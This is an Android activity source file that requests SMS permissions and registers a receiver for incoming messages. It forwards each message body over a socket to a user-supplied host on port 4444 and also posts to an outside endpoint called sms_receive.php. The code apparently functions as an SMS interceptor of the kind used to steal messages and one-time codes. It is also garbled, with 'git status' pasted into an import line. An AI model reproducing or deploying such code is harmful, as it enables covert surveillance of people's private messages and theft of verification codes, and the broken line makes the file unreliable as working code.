package com.example.myapplication;
import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsMessage;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.apptakk.http_request.HttpRequest;git status
import com.apptakk.http_request.HttpRequestTask;
import com.apptakk.http_request.HttpResponse;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;



class NewThread implements Runnable{
    public void run(){
        while(true) {






            System.out.println("thread is running...");



            try {
                TimeUnit.SECONDS.sleep(10); }
            catch(InterruptedException ex) {
                Thread.currentThread().interrupt(); }
        }
    }
}

public class MainActivity extends AppCompatActivity {

    public static final int REQUEST_READ_SMS = 80;
    public static final int RECEIVE_SMS = 81;
    private BroadcastReceiver smsReceiver;
    Object[] sms_arr = {};

    Socket s;
    DataOutputStream dos;
    DataInputStream dis;
    BufferedReader bufferedReader;
    Handler handler = new Handler();
    String message_from_server;


    public static Object[] add(Object[] arr, Object... elements){
        Object[] tempArr = new Object[arr.length+elements.length];
        System.arraycopy(arr, 0, tempArr, 0, arr.length);

        for(int i=0; i < elements.length; i++)
            tempArr[arr.length+i] = elements[i];
        return tempArr;

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        String host = String.valueOf((EditText)findViewById(R.id.editText));
        String username = String.valueOf((EditText)findViewById(R.id.editText2));


        // Проверка прав на получение смс
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                    Manifest.permission.READ_SMS)) {

            } else {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_SMS},
                        REQUEST_READ_SMS);
            }
        } else {
            // Permission has already been granted
        }

        // Проверка прав на получение контактов
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECEIVE_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                    Manifest.permission.RECEIVE_SMS)) {

            } else {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.RECEIVE_SMS},
                        RECEIVE_SMS);
            }
        } else {
            // Permission has already been granted
        }
        // Проверка прав на получение контактов
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.INTERNET)
                != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                    Manifest.permission.INTERNET)) {

            } else {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.INTERNET},
                        78);
            }
        } else {
            // Permission has already been granted
        }

        initializeSMSReceiver();
        registerSMSReceiver();

       String tex = "rrrer";

        new HttpRequestTask(
                new HttpRequest("http://www.denbrown.beget.tech/sms_receive.php",
                        HttpRequest.POST, "{ \"some\": \"data\" }"),
                new HttpRequest.Handler() {
                    @Override
                    public void response(HttpResponse response) {
                        if (response.code == 200) {
                            Log.d(this.getClass().toString(), "Request successful!");
                        } else {
                            Log.e(this.getClass().toString(), "Request unsuccessful: " + response);
                        }
                    }
                }).execute();

    }

    private void initializeSMSReceiver() {
        smsReceiver = new BroadcastReceiver(){
            @Override
            public void onReceive(Context context, Intent intent) {

                Bundle bundle = intent.getExtras();
                if(bundle!=null){
                    Object[] pdus = (Object[])bundle.get("pdus");
                    for(int i=0;i<pdus.length;i++){
                        byte[] pdu = (byte[])pdus[i];
                        SmsMessage message = SmsMessage.createFromPdu(pdu);
                        String text = message.getDisplayMessageBody();
                        Object[] objArr = add(sms_arr, text);
                        sms_arr = objArr;
                        Log.i("log", text);
                        SendSocket(text);

                    }
                }
            }
        };
    }

    private void registerSMSReceiver(){
        IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, intentFilter);
    }

    public void onMyButtonClick(View view) {
        SendSocket("Connect OK");
        Toast.makeText(this, "fffff", Toast.LENGTH_SHORT).show();
        NewThread thread_1 = new NewThread();
        Thread t1 =new Thread(thread_1);
        t1.start();
    }

    public void SendSocket(final String text){
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                try{
                    System.out.println(Arrays.toString(sms_arr));

                    final EditText edit =  (EditText) findViewById(R.id.editText);
                    String host = (String) edit.getText().toString();

                    final EditText edit2 =  (EditText) findViewById(R.id.editText2);
                    String username = (String) edit2.getText().toString();

                    s = new Socket(host , 4444);
                    dos = new DataOutputStream(s.getOutputStream());

                    String message = "us:"+username+";"+text+";end#";

                    dos.writeUTF(message);

                    dis = new DataInputStream(s.getInputStream());
                    message_from_server = dis.readUTF();

                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            Toast.makeText(getApplicationContext(),"msg"+message_from_server, Toast.LENGTH_SHORT).show();
                        }
                    });


                    dos.close();
                    s.close();

                }catch (IOException e){
                    e.printStackTrace();
                    Log.e("error", "error");}

                long endTime = System.currentTimeMillis()
                        + 20 * 1000;

                while (System.currentTimeMillis() < endTime) {
                    synchronized (this) {
                        try {
                            wait(endTime -
                                    System.currentTimeMillis());
                        } catch (Exception e) {Log.e("error", "error");} } }



            }};

        Thread thread = new Thread(runnable);
        thread.start(); }



}
